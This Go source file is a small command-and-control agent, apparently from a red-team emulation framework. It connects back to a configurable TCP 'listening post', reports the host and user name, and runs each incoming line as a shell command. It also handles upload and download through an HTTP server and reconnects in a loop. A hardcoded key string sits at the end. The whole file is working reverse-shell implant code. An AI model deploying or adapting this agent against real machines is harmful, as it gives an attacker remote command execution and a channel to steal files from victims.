package main

import (
   "bufio"
   "fmt"
   "net"
   "strings"
   "os"
   "os/user"
   "time"
   "flag"

   "./commands"
)

var paw, httpServer string

func runNextCommand(message string) []byte {
   if strings.HasPrefix(message, "cd") {
      pieces := strings.Split(message, "cd")
      bites := commands.ChangeDirectory(pieces[1])
      return bites
   } else if (strings.HasPrefix(message, "download")) {
      pieces := strings.Split(message, "download")
      go commands.Download(httpServer, pieces[1])
      return []byte("Download initiated\n")
   } else if (strings.HasPrefix(message, "upload")) {
      pieces := strings.Split(message, "upload")
      go commands.Upload(httpServer, pieces[1], paw)
      return []byte("Upload initiated\n")
   } else {
      bites := commands.Execute(message)
      return bites
   }
}

func listen(conn net.Conn) {
   scanner := bufio.NewScanner(conn)
    for scanner.Scan() {
       message := scanner.Text()
       bites := runNextCommand(message)
       conn.Write(bites)
    }
}

func main() {
   host, _ := os.Hostname()
   user, _ := user.Current()
   paw = fmt.Sprintf("%s$%s", host, user.Username)

   tcp := flag.String("tcp", "127.0.0.1:5678", "The IP of the TCP listening post")
   http := flag.String("http", "http://127.0.0.1:8888", "The IP of the HTTP listening post")
   flag.Parse()
   httpServer = *http

   for {
      conn, err := net.Dial("tcp", *tcp)
      if err != nil {
         fmt.Println(err)
         time.Sleep(5 * time.Second)
         continue
      }
      conn.Write([]byte(paw))
      listen(conn)
   }
}

var key = "MY3DUY6IVC5LN956Q4KUEQEZ2TRQL9"